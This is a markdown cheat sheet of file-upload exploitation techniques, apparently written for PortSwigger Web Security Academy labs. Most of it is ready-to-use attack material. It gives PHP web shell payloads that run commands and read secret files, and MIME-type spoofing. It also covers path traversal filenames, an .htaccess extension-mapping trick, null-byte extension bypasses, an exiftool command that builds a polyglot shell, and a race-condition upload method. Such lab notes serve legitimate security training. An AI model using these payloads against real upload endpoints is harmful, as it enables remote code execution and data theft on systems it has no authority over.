# 📁 File Upload Vulnerabilities Cheatsheet

Complete methodology, bypass techniques, and exploitation vectors for File Upload labs tested in PortSwigger Web Security Academy.

---

## 📌 Attack Vectors & Methodology

* Target Endpoints: `/upload`, `/avatar`, `/profile/image`, `/media/upload`
* Primary Web Shell Payload (PHP):
  - `<?php echo file_get_contents('/home/carlos/secret'); ?>`
  - `<?php system($_GET['cmd']); ?>`

---

## 🛠️ Detailed Breakdown & Payloads

* **Remote code execution via web shell upload:**
  - Upload a standard PHP script (`shell.php`) directly without restrictions and request it via GET:
  - `GET /files/avatars/shell.php`

* **Web shell upload via Content-Type restriction bypass:**
  - Intercept the upload request and change the MIME type header:
  - Change `Content-Type: application/x-php` to `Content-Type: image/jpeg` or `Content-Type: image/png`

* **Web shell upload via path traversal:**
  - Change the `filename` parameter to execute the file in a directory where script execution is enabled:
  - `filename="..%2fshell.php"` or `filename="../shell.php"`

* **Web shell upload via extension blacklist bypass (.htaccess / AddType):**
  - First upload a custom `.htaccess` file to map a custom extension to PHP:
  - `AddType application/x-httpd-php .l33t`
  - Then upload your web shell saved as `shell.l33t`

* **Web shell upload via obfuscated file extension (%00 Null Byte):**
  - Bypass extension whitelist checking by injecting a null byte before the allowed extension:
  - `shell.php%00.jpg`

* **Remote code execution via polyglot web shell upload (Exiftool):**
  - Inject PHP payload into image metadata using exiftool to preserve valid image headers:
  - `exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" image.jpg -o polyglot.php`

* **Web shell upload via race condition:**
  - Send the upload request and immediate GET request in parallel (using Burp Turbo Intruder or HTTP/2 single-packet attack) before the server validates and deletes the temporary file:
  - `GET /files/avatars/shell.php` (executed simultaneously with upload)
